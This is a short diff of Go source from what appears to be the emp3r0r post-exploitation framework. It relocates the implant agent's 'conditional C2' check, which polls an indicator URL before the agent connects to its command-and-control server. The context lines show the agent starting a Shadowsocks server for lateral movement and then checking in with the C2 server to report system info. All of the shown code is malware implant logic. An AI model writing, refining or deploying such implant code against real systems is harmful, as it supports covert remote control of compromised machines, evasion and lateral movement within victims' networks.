@@ -247,6 +247,16 @@ test_agent:
 	go c2transport.ShadowsocksServer() // start shadowsocks server for lateral movement
 
 connect:
+	// check preset CC status URL, if CC is supposed to be offline, take a nap
+	if common.RuntimeConfig.CCIndicatorWaitMax > 0 &&
+		common.RuntimeConfig.CCIndicatorURL != "" { // check indicator URL or not
+		if !c2transport.ConditionalC2Yes(common.RuntimeConfig.C2TransportProxy) {
+			log.Println("Conditional C2 check failed, signaling parent and exiting")
+			conditionalC2FailNotify()
+			return
+		}
+	}
+
 	// apply whatever proxy setting we have just added
 	def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
 	if def.HTTPClient == nil {
@@ -260,15 +270,6 @@ connect:
 		log.Println("Not using proxy")
 	}
 
-	// check preset CC status URL, if CC is supposed to be offline, take a nap
-	if common.RuntimeConfig.CCIndicatorWaitMax > 0 &&
-		common.RuntimeConfig.CCIndicatorURL != "" { // check indicator URL or not
-		if !c2transport.ConditionalC2Yes(common.RuntimeConfig.C2TransportProxy) {
-			log.Println("Conditional C2 check failed, signaling parent and exiting")
-			conditionalC2FailNotify()
-			return
-		}
-	}
 	log.Printf("Checking in on %s", def.CCAddress)
 
 	// check in with system info
